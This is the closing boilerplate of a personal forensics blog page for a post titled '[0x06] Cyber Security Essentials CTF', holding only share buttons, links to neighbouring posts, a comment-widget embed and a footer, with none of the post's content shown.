+<a class=resp-sharing-button__link href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f&media=https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f;description=%5b0x06%5d%20Cyber%20Security%20Essentials%20CTF" target=_blank rel=noopener aria-label title="Share on pinterest">
+<div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f&title=%5b0x06%5d%20Cyber%20Security%20Essentials%20CTF&summary=%5b0x06%5d%20Cyber%20Security%20Essentials%20CTF&source=https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f" target=_blank rel=noopener aria-label title="Share on linkedin">
+<div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f&resubmit=true&title=%5b0x06%5d%20Cyber%20Security%20Essentials%20CTF" target=_blank rel=noopener aria-label title="Share on reddit">
+<div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f;title=%5b0x06%5d%20Cyber%20Security%20Essentials%20CTF" target=_blank rel=noopener aria-label title="Share on xing">
+<div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="whatsapp://send?text=%5b0x06%5d%20Cyber%20Security%20Essentials%20CTF%20https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f" target=_blank rel=noopener aria-label title="Share on whatsapp">
+<div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f&t=%5b0x06%5d%20Cyber%20Security%20Essentials%20CTF" target=_blank rel=noopener aria-label title="Share on hacker news">
+<div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://telegram.me/share/url?text=%5b0x06%5d%20Cyber%20Security%20Essentials%20CTF&url=https%3a%2f%2fwho1s.github.io%2fposts%2f2020%2f07%2f0x06-cyber-security-essentials-ctf%2f" target=_blank rel=noopener aria-label title="Share on telegram">
+<div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+</div>
+</div>
+</a>
+</div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h></span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=https://who1s.github.io/posts/2021/09/0x07-migrated-to-github/>
+<span class=button__icon>←</span>
+<span class=button__text>[0x07] Migrated to Github</span>
+</a>
+</span>
+<span class="button next">
+<a href=https://who1s.github.io/posts/2020/07/0x05-phishing-mfa-accounts/>
+<span class=button__text>[0x05] Phishing MFA accounts</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+<div id=comments>
+<div id=disqus_thread></div>
+<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//dfir-blog.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</div>
+</main>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class=footer__content>
+<span>&copy; 2021</span>
+<span><a href=https://who1s.github.io>Juho Jauhiainen</a></span>
+<span><a href=https://who1s.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
+</div>
+</div>
+<div class=footer__inner>
+<div class=footer__content>
+<span>It's all about forensics</span>
+</div>
+</div>
+</footer>
+</div>
+<script type=text/javascript src=https://who1s.github.io/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+</body>
+</html>
